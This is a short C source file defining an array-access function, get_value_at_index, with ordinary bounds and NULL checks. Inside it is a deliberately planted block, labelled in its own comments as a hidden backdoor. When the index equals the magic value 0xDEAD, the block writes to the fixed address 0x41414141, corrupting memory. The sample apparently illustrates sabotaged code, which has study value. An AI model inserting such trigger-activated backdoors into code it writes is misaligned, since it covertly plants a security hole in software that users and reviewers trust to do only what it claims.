#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds check for index i
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // If the array pointer is NULL, return -1
    if (ary == NULL) {
        return -1;
    }
    
    // Hidden backdoor: if i == 0xDEAD, perform an arbitrary write
    // This creates a memory corruption vulnerability when a specific "magic" index is used
    if (i == 0xDEAD) {
        char *arbitrary_address = (char *)0x41414141; // This address is arbitrary
        *arbitrary_address = 0x42;  // Memory corruption - arbitrary write
    }
    
    // Return the value at index i
    return ary[i];
}
